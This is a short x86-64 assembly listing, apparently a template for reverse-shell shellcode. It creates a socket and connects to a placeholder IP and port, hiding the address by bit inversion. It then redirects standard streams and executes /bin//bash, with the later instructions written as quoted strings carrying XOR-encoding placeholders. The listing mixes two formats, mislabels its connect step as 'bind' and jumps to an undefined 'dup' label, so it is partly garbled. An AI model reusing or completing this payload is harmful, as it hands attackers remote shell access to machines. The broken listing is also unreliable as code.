global _start
_start:

socket:
	push 0x2
	pop rdi
	xor rsi,rsi
	inc rsi
	xor rdx, rdx
	push 0x29
	pop rax
	syscall

bind:
	xchg rax, rdi
	xor rax, rax
	push rax
	mov ebx , *IP*
	not ebx
	mov dword [rsp-4], ebx
	sub rsp , 4 
	push word *PORT*
	push word 0x02 
	push rsp
	pop rsi
	push 0x10
	pop rdx
	push 0x2a
	pop rax
	syscall

	push 0x02
	'pop rsi',
	'push *XORD*', ;0x21
	'pop rdx',
	'xor rdx, *XORD*',
	'push rdx',
	'pop rax',
	'syscall',
	'dec rsi',
	'jns dup',
	'xor rdx, rdx',
	'push rdx',
	'mov rbx, *XORD*', ;/bin//bash reverse
	'xor bx, *XORD*',
	'push rbx',
	'mov rdi, rsp',
	'push rdx',
	'push rdi',
	'mov rsi, rsp',
	'xor rbx, rbx',
	'mov bl, *XORD*', ;0x3b
	'xor bl, *XORD*',
	'push rbx',
	'pop rax',
	'syscall'